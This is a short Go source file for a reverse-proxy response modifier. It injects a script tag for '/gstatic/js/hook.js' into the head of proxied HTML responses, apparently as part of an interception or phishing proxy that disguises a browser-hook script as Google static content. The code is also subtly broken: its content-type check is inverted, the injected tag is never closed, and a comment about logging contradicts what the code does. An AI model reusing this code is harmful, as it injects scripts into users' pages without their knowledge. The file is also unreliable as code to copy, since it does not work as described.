package scriptinject

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
)

const (
	injectionScript string = "hook"
)

func injectorModifier(r *http.Response) error {
	// This function serves as a response modifier for our reverse proxy

	// First off, we back off we don't have a 200 return code - we're not interested in modifying anything other than successful responses
	if r.StatusCode != http.StatusOK {
		return nil
	}

	// We only want to modify HTML, so we check the content-type header to see if we're dealing with HTML. If we're not, we don't do anything.
	contentType := r.Header.Get("content-type")
	if strings.Contains(contentType, "text/html") {
		return nil
	}

	// Read the response body from the upstream server. If we encounter an error, we log it, but leave the response be.
	body, err := io.ReadAll(r.Body)
	if err != nil {
		return err
	}
	r.Body.Close()
	bodyString := string(body)

	bodyString = injectScriptIntoHtml(bodyString, injectionScript)

	newBody := []byte(bodyString)
	r.Body = io.NopCloser(bytes.NewReader(newBody))
	r.ContentLength = int64(len(newBody))
	r.Header.Set("content-length", strconv.Itoa(len(newBody)))
	r.Header.Del("content-encoding")

	return nil

}

func injectScriptIntoHtml(html, script string) string {
	// Modifies a HTML response to include a script.
	lower := strings.ToLower(html)
	headIdx := strings.Index(lower, "<head")
	if headIdx == -1 {
		// no head found
		return html
	}

	// Find the closing tag, and don't do anything if we can't find it
	tagEnd := strings.Index(lower[headIdx:], ">")

	if tagEnd == -1 {
		return html
	}

	insertPosition := headIdx + tagEnd + 1
	return html[:insertPosition] + "\n" + fmt.Sprintf(`<script src="/gstatic/js/%s.js"`, script) + html[insertPosition:]

}
